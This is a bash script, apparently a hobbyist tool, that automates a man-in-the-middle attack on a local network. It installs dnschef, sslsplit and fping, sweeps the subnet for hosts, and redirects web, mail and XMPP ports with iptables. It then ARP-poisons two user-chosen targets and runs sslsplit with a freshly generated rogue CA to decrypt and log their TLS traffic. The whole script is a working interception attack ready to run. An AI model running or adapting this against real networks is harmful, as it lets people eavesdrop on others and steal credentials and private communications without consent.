#!/bin/bash

#COLORS
orange='\e[38;5;166m'
red='\e[1;31m'
yellow='\e[0;33m'
cyan='\e[0;36m'
green='\e[0;34m'
blue='\e[1;34m'

if [ `whoami` != 'root' ]
  then
    echo -e "$red" "You must be root to do this."
    exit
fi

echo -e "$cyan" "Welcome to the assisted man in the midile attack"
echo -e "$cyan" "First things first we need to make sure everything is Ok ^_¯"
echo ""
echo -e "$yellow" "detecting your network interface "
sleep 1
interface=$(ip -o link show | grep 'state UP' | awk -F': ' '{print $2}')
echo -e "$green" "your network interface : $interface"
echo -e "$yellow" "detecting your locale ip adress "
sleep 1
lanip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
echo -e "$green" "your locale ip adress : $lanip"

#Checking if needed tools exist

#starting with dnschef
echo "_________________________________________________________________________>"

which dnschef > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
	echo -e "$green" "[ ✔ ] Dnschef..................[ found ]"
	echo ""
	sleep 1
	echo ""
else
	sleep 1
	echo -e "$red" "[ X ] Dnschef  -> not found "
	sleep 1
	echo -e "$blue" "installing it ^_^"

#checking you internet connection

	echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1

	if [ $? -ne 0 ]; then
        	echo -e $red [ X ]::[Internet Connection]: OFFLINE!;
        	echo -e $red Must have internet connection to download needed tools -__-
        	sleep 1
        	exit
	else
        	echo -e $green [✔]::[Internet Connection]: CONNECTED!;
        	echo -e $green Continueing ^__^
        	sleep 1
		apt-get update && apt-get upgrade -y && apt-get install dnschef -y
	fi
fi
#moving to sslspit
echo "_________________________________________________________________________>"

which sslsplit > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
	echo -e "$green" "[ ✔ ] Sslsplit..................[ found ]"
	echo ""
	sleep 1
	echo ""
else
	sleep 1
	echo -e "$red" "[ X ] Sslsplit  -> not found "
	sleep 1
	echo -e "$blue" "installing it ^_^"

#checking you internet connection

	echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1

	if [ $? -ne 0 ]; then
		echo -e $red [ X ]::[Internet Connection]: OFFLINE!;
		echo -e $red Must have internet connection to download needed tools -__-
		sleep 1
		exit
	else
		echo -e $green [✔]::[Internet Connection]: CONNECTED!;
    		echo -e $green Continueing ^__^
		sleep 1
		apt-get update && apt-get upgrade -y && apt-get install sslsplit -y
	fi
fi

#checking fping
echo "_________________________________________________________________________>"

which fping > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
        echo -e "$green" "[ ✔ ] Fping..................[ found ]"
        echo ""
        sleep 1
        echo ""
else
        sleep 1
        echo -e "$red" "[ X ] Fping  -> not found "
        sleep 1
        echo -e "$blue" "installing it ^_^"

#checking you internet connection

        echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1

        if [ $? -ne 0 ]; then
                echo -e $red [ X ]::[Internet Connection]: OFFLINE!;
                echo -e $red Must have internet connection to download needed tools -__-
                sleep 1
                exit
        else
                echo -e $green [✔]::[Internet Connection]: CONNECTED!;
                echo -e $green Continueing ^__^
                sleep 1
                apt-get update && apt-get upgrade -y && apt-get install fping -y
        fi
fi

echo -e "$cyan" "I guess everything is Oookay"

echo "_________________________________________________________________________>"

#Searching for targets
echo -e "$red" "Now w search for targets "

sleep 1
echo ""
#clear

echo -e "$orange" "live hosts will be shown here "
startip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}').1
endip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}').255

sleep 1
fping -g $startip $endip -a -q

echo "_____________________________________________________________________________________"

#enable ip forward and NAT engine
sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080

#selecting targets
echo -e "$yellow" "now you will need to select 2 targets one of them your router which ip adress usualy ends with 1"
echo -e "$yellow" "ex: 192.168.1.1"
echo -e "$cyan" "enter first target's ip adress: "
read tar1
sleep 1
echo -e "$cyan" "enter second target's ip adress: "
read tar2
sleep 1
#arp poisoning
trap "kill 0" EXIT

arpspoof -i $interface -t $tar1 $tar2 > /dev/null 2>&1 &
arpspoof -i $interface -t $tar2 $tar1 > /dev/null 2>&1 &

# Checking if target directory exists in main user root
echo -e "$blue" "checking if Sslfolder exists"
output="${HOME}/Sslfolder"
sleep 1
if [[ ! -d "${output}" ]]; then
	echo -e "$red" "not found"
	echo -e "$green" "creating it with some sub-directories"
	mkdir "${output}" >/dev/null 2>&1
	mkdir "${output}/sslsplit" >/dev/null 2>&1
	mkdir "${output}/logdir" >/dev/null 2>&1
	echo -e "$green" "Done"
else
	echo -e "$green" "found"
fi
sleep 1
echo -e "$blue" "your files will be found in $output" 
cd $output
#creating root certificate with key and starting the sslsplit attack
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
sslsplit -D -l connections.log -j $output/sslsplit/ -S $output/logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
